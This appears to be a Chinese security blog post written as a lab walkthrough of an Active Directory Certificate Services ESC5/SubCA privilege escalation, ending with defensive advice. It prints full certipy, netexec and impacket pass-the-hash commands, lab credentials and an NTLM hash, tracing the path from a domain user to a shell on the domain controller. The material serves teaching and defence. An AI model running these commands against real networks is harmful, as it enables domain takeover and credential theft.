---
title: ADCS-ESC5 权限误配置利用：结合 SubCA 模板获取域控权限
url: https://mp.weixin.qq.com/s/bnF3-MaclG5UYDdvREnWww
source: Doonsec's feed
date: 2026-06-24
fetch_date: 2026-06-25T06:02:58.751565
---

# ADCS-ESC5 权限误配置利用：结合 SubCA 模板获取域控权限

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/JibvIcnkZHNeU4zD5CIrcdBeP0icbVVQGVasMySLAcdoK2uTPlibE4d8y5dFN6vDkLHkib8U9icU4HhXqLicyZNuBd1uiaw3rleywKVs7vHLTclicCY/0?wx_fmt=jpeg)

# ADCS-ESC5 权限误配置利用：结合 SubCA 模板获取域控权限

原创

jzhoucdc
jzhoucdc

攻防之路JZhoucdc

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

**一、漏洞背景**

Active Directory Certificate Services（ADCS）是 Windows 域环境中常见的证书服务组件，主要用于证书签发、身份认证、加密通信等场景。在域环境中，如果 ADCS 的证书模板、证书颁发机构（CA）权限或 PKI 相关对象权限配置不当，攻击者可能通过申请、审批或获取高权限用户证书的方式，实现域内权限提升。

本案例中，攻击者已经获取到普通域用户 `cken` 的凭证。虽然该用户本身不是域管理员，但其具备 CA 管理相关权限，并且目标环境中存在可被滥用的 `SubCA` 证书模板。攻击者可以结合证书模板误配置与 CA 管理权限，申请 Administrator 身份的证书，并最终通过证书认证获取管理员 NTLM Hash，进一步接管域控。

该攻击链的核心点在于：

1. 攻击者拥有可用的域用户凭证；
2. 目标环境部署了 ADCS；
3. 存在可被滥用的证书模板，例如 `SubCA`；
4. 攻击者具备 CA 管理相关权限，例如 `ManageCA` / `ManageCertificates`；
5. 攻击者可以通过证书认证冒充高权限用户。

---

**二.实验环境**

目标拓扑：

![](https://mmbiz.qpic.cn/mmbiz_png/JibvIcnkZHNdqPaH1YxHG0LxbzA96NdwDlczfnY8NnhbiaEXW62MpcA0M82eLDxkB0iaDbs3ibBz3kWDLice4jhzicy4fpadtz8z2LW9RK68OPsxQ/640?wx_fmt=png&from=appmsg)

已知凭证：

```
cken:Superman001
```

注意：本文内容仅用于授权实验环境和安全研究，不适用于未授权目标。

---

三、建立代理隧道

由于目标环境位于内网，需要先通过跳板机建立 SSH 动态端口转发，将本地 `127.0.0.1:1080` 作为 SOCKS 代理使用。

```
ssh -N -f -D 127.0.0.1:1080 htb-student@10.129.205.205 -oStrictHostKeyChecking=accept-new
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/JibvIcnkZHNfmDjBWgWIG16BQZxOMLLomRiciaIsAl0t9vKv7xTpDKHfibSd53UPbMIcYRgAAxLI02WbItwmko5NgvaZH7B3dY5ppmUCia7LIh9A/640?wx_fmt=png&from=appmsg)

---

四、验证域内连通性

代理建立完成后，使用 `proxychains4` 配合 `netexec` 测试 SMB 连接情况。

```
proxychains4 -q nxc smb 172.16.19.3 172.16.19.5 -u cken -p Superman001
```

```
这里主要用于确认：
```

1. 代理是否可用；
2. 目标主机是否可达；
3. 当前凭证是否有效；
4. SMB 服务是否可以正常认证。

如果认证成功，说明后续可以通过代理继续进行 ADCS 枚举和证书请求操作。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/JibvIcnkZHNdQYp4yysRrLKOWjfJWu31s6cV9Mom5rvX7qkInIMLicz7htnd0e2bGQsfrYYOs3auuHpuIibzXj07PwmaLEoMsRyooXibI0YCWGs/640?wx_fmt=png&from=appmsg)

---

五、枚举 ADCS 配置

使用 `certipy-ad find` 枚举域内 ADCS 配置，包括 CA、证书模板、模板权限、证书用途以及潜在 ESC 风险。

```
proxychains4 -q certipy-ad find -u cken@lab.local -p Superman001 -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp -enabled -stdout
```

![](https://mmbiz.qpic.cn/mmbiz_png/JibvIcnkZHNeaOHAt37Sq688Y4J9Cp3W0WpXrIGumq7VLZczEeuqAMg58AkOMDDNQ2Qey9UcXbdYzmBDP5kxW5aNzbEvc352U2iab7tf2FxHY/640?wx_fmt=png&from=appmsg)

在枚举结果中发现 `SubCA` 模板存在可利用风险。该模板默认允许 `Client Authentication`，并且当前用户 `cken` 具备与 CA 管理相关的高权限，因此可以进一步尝试申请 Administrator 身份的证书。

本场景的关键不只是模板本身存在风险，而是攻击者同时具备 CA 相关管理权限，能够对原本被拒绝或处于待审批状态的证书请求进行后续操作。

---

六、申请 Administrator 证书

使用 `certipy-ad req` 指定 `SubCA` 模板，并通过 `-upn Administrator` 伪造目标用户身份，尝试申请 Administrator 的证书。

```
proxychains4 -q certipy-ad req -u cken@lab.local -p Superman001 -dc-ip 172.16.19.3 -target-ip 172.16.19.5 -ca lab-WS01-CA -template SubCA -upn Administrator@lab.local
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/JibvIcnkZHNdD1ib37wXVXGGL23xULfMhdhpNXwza2QvOSUQ3eRiaXzEicxzY1JwQDibicPHzNKdH3vGjhdDfYXk2ibPsyR0sQflQogwokFibomGpgQ/640?wx_fmt=png&from=appmsg)

执行后，CA 可能不会直接签发证书，而是返回拒绝或待审批状态。此时需要重点记录返回的 `Request ID`，因为后续需要基于该请求 ID 继续审批和获取证书。

---

七、滥用 CA 权限签发证书

由于 `cken` 具备 CA 管理/证书管理相关权限，尤其是可对证书请求进行管理的权限，因此可以通过 `certipy-ad ca` 对指定 Request ID 执行签发操作。

```
proxychains4 -q certipy-ad ca -u cken -p Superman001 -dc-ip 172.16.19.3 -target-ip 172.16.19.5 -ca lab-WS01-CA -issue-request 13
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/JibvIcnkZHNfl4QPgBxiaficntpg45cInibs64dCzLzK0fIYlOnsOrQlreWhyx1qJWY0DtuCBJLrEcia1Dkhm4dXw76t3MPhEbPOenJhGgAT0Rt0/640?wx_fmt=png&from=appmsg)

这一步的核心是利用 CA 管理权限绕过正常的证书审批流程，将原本无法直接获取的高权限用户证书请求变为已签发状态。

---

八、获取已签发证书

证书签发完成后，继续使用 `certipy-ad req` 的 `-retrieve` 参数，根据请求 ID 获取对应的 PFX 证书文件。

```
proxychains4 -q certipy-ad req -u cken -p Superman001 -dc-ip 172.16.19.3 -target-ip 172.16.19.5 -ca lab-WS01-CA -retrieve 13
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/JibvIcnkZHNfyccUUzKgaYXQ2nAUrq0DDXtfon2Usc9UHMWw7XAFIe7YsX0J33c20y28Y1exCX1qkp3EkzkhGhurnR1uxc4whfPJ9bkWic910/640?wx_fmt=png&from=appmsg)

执行成功后，会在本地生成 Administrator 对应的 PFX 证书文件，例如：

```
administrator_0d926652-db3b-432e-944c-27bf1e1d696e.pfx
```

该证书可以用于后续的证书认证，进一步获取 Administrator 的 TGT 或 NTLM Hash。

---

九、使用证书进行认证

通过 `certipy-ad auth` 使用获取到的 PFX 证书进行认证，请求 Administrator 的 TGT，并通过 UnPAC-the-Hash 获取 NTLM Hash。

```
proxychains4 -q certipy-ad auth -pfx administrator_0d926652-db3b-432e-944c-27bf1e1d696e.pfx -domain lab.local -dc-ip 172.16.19.3
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/JibvIcnkZHNegGH3EpfPYwl0lQVt3ms3z1Ra7C1VKbu7tPGja7eHpTYP5YIuMpCiaa6ia1ibSy5TBOXJsbuoKiae1AQVIianZm7JqD69lBic2eLjRU/640?wx_fmt=png&from=appmsg)

成功后可获得 Administrator 的 TGT票据和NTLM Hash：

```
6e599ada28db049c044cc0bb4afeb73d
```

至此，攻击者已经从普通域用户 `cken` 提权到 Administrator 身份。

---

十、通过 Hash 传递获取域控 Shell

获取 Administrator 的 NTLM Hash 后，可以使用 Impacket 工具进行 Pass-the-Hash，连接域控并获取远程命令执行权限。

```
proxychains4 -q impacket-wmiexec -no-pass -hashes :6e599ada28db049c044cc0bb4afeb73d administrator@172.16.19.3
```

![](https://mmbiz.qpic.cn/mmbiz_png/JibvIcnkZHNdTmKMek4umPYGUqXibI1NDlj9iaEcpFiaAJT2PO6Fiad0OBWwZysl6bkhZX5lJXZjibkicaLdAibSRJD1EkRRhmiawBRWkyfZXP445mdc/640?wx_fmt=png&from=appmsg)

---

![](https://mmbiz.qpic.cn/sz_mmbiz_png/JibvIcnkZHNeq7o5CDFR5vBLFaK29L2TYsTco3Jb2dV2Mf9h5iamDDTIrOsj8UFqJFvu4t2Km3vQVOYDMymGgrVhDpT3lWYQaDbkxwmneBws0/640?wx_fmt=png&from=appmsg)

---

十一.防御建议

## 1. 严格控制 CA 管理权限

限制 `ManageCA` 和 `ManageCertificates` 权限，仅允许少数域管理员或专用 PKI 管理组使用，避免普通用户或业务账号拥有 CA 级控制能力。

## 2. 最小化证书模板风险配置

关闭或限制高危模板能力，例如 `Enrollee Supplies Subject`，并严格控制 `Client Authentication` 等用途。对于不需要使用的 `SubCA`、智能卡登录、客户端认证类模板，应取消发布或限制注册权限，仅开放必要业务模板及最小 Enrollment 权限。

## 3. 启用审计与监控 CA 行为

开启 ADCS 审计日志，重点监控证书签发、审批及异常 Request ID 行为，并结合 SIEM 检测非正常 CA 管理操作与批量证书请求。

##

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/9TcGQTMQS71Y9RxBw7gPUNkibkBV22AxHU4QjFr3hERqQyWNHIiaaY3As9x7WgZrL6KZgBf16kN1gUibEyQW4akxQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过